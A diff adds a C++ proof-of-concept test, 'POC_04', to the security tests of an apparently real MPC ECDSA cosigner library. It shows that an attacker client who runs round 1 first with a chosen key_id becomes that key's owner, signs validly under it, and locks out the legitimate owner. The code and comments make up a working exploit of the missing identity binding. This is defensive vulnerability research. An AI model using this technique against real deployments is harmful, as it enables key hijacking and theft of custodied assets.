@@ -244,3 +244,81 @@ TEST_CASE("POC_02_preprocessing_data_dtor_leaks")
 // PoC 3 (protocol version downgrade) was removed: it asserted a locally
 // reimplemented copy of the guard rather than exercising library code, so it
 // contributed no evidence beyond reading cmp_ecdsa_offline_signing_service.cpp:98.
+
+// ---------------------------------------------------------------------------
+// PoC 4 -- Round 1 has the SAME missing binding, and round 1 is not bounded to
+// destruction.
+//
+// bam_ecdsa_cosigner_server.cpp:291 commit_to_share() accepts an arbitrary
+// key_id and an arbitrary client_id. Its only identity check is:
+//
+//     if (client_id == server_id) { ...throw... }      // :300
+//
+// It then stores peer_id = client_id at :306. So a party that reaches round 1
+// first becomes the LEGITIMATE peer_id for that key_id -- and therefore passes
+// the peer_id check at :628 and can sign.
+//
+// This is why fixing :384 alone does not fix the class: with a peer_id check
+// added to round 2, an attacker that pre-empts round 1 still owns the key
+// outright. Note also that BAM's persistency interface has no key_exist() and
+// no way to look up a key's owning tenant (contrast cmp_key_persistency.h:51
+// and :54), so the library cannot tell whether a key_id is already spoken for.
+// ---------------------------------------------------------------------------
+TEST_CASE("POC_04_bam_round1_preemption_yields_a_signable_key")
+{
+    const uint64_t ATTACKER_CLIENT_ID = 0xA77ACC01;
+    const uint64_t VICTIM_CLIENT_ID   = client_id;
+
+    TestSetup attacker;
+    TestSetup victim;
+
+    // A key_id the attacker simply picks. In a real deployment this is whatever
+    // identifier the platform will later associate with a customer.
+    const std::string TARGET_KEY_ID     = new_uuid();
+    const std::string attacker_setup_id = new_uuid();
+
+    elliptic_curve256_point_t X_client, X_server;
+
+    // The attacker runs the entire ceremony against a key_id of its choosing,
+    // under its own setup and its own true identity. Nothing objects.
+    REQUIRE_NOTHROW(bam_key_generation(attacker_setup_id, TARGET_KEY_ID, ATTACKER_CLIENT_ID, server_id,
+                                       attacker.server, attacker.client, ECDSA_SECP256K1, X_client, X_server));
+
+    printf("\n[PoC 4] attacker-chosen key_id ... %s\n", TARGET_KEY_ID.c_str());
+    printf("[PoC 4] keygen as attacker ....... completed (peer_id is now the attacker)\n");
+
+    // The payload: unlike the round-2 hijack, the attacker can now SIGN, because
+    // the :628 check compares peer_id against the attacker -- and matches.
+    const std::string tx_id = new_uuid();
+    elliptic_curve256_scalar_t hash;
+    REQUIRE(RAND_bytes(hash, sizeof(hash)));
+    fbc::signing_data data_to_sign = {{0}, {{ fbc::byte_vector_t(&hash[0], &hash[sizeof(hash)]), {44, 0, 0, 0, 0} }}};
+    fbc::recoverable_signature signature {0};
+
+    REQUIRE_NOTHROW(bam_key_sign(attacker_setup_id, TARGET_KEY_ID, tx_id, ATTACKER_CLIENT_ID, data_to_sign, "",
+                                 attacker.server, attacker.client, signature, ECDSA_SECP256K1));
+    verify_ecdsa_signature(ECDSA_SECP256K1, X_client, X_server, signature, data_to_sign, false);
+    printf("[PoC 4] attacker produced a VALID signature under that key_id  <-- not merely destruction\n");
+
+    // And the key_id is now spoken for: the legitimate owner cannot use it. The
+    // only thing standing in the way is the host's overwrite=false semantics on
+    // store_key_metadata -- the library itself never checks.
+    commitments_sha256_t B;
+    fbc::bam_ecdsa_cosigner::server_setup_shared_data victim_setup;
+    const std::string victim_setup_id = new_uuid();
+    REQUIRE_NOTHROW(victim.server.generate_setup_with_proof(victim_setup_id, get_tenant_id(), ECDSA_SECP256K1, victim_setup));
+
+    bool victim_can_claim_key_id = true;
+    try
+    {
+        attacker.server.generate_share_and_commit(victim_setup_id, TARGET_KEY_ID, server_id,
+                                                  VICTIM_CLIENT_ID, ECDSA_SECP256K1, B);
+    }
+    catch (const fbc::cosigner_exception&)
+    {
+        victim_can_claim_key_id = false;
+    }
+    printf("[PoC 4] legitimate owner can still claim that key_id ... %s\n",
+           victim_can_claim_key_id ? "YES" : "no (key_id permanently taken)");
+    CHECK_FALSE(victim_can_claim_key_id);
+}
